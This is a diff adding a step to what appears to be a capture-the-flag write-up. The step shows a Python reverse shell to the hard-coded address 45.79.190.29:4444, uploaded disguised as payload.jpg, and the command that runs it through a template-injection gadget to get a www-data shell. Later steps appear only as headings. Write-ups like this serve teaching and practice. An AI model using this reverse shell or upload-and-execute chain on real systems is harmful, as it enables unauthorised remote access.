@@ -125,6 +125,21 @@ The following indexes where discovered that would allow RCE:
 ![SSTI Enumeration](/images/snowblind_enumeration2.jpg) 
 
 Step Three: Achieve Shell Access : Insecure File Upload
+
+The following payload was inserted into a file called payload.jpg and uploaded to the admin profile.
+
+```
+#!/bin/sh
+export RHOST="45.79.190.29";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
+
+Selecting index 205 with get > os > popen.read() as our target, the following command was executed, resulting in a shell running in the www-data context.
+
+```
+sh /app/static/images/admin\\u005ff1f9cc53781abb79\\u002epng
+```
+
+
 Step Four: Exfilitrate Data : Insecure processes / Data Leakage
 Step Five:  Decode PNG file : Leak Sensitive Information
 Step Six: Crack Hash for Root : Weak Password 
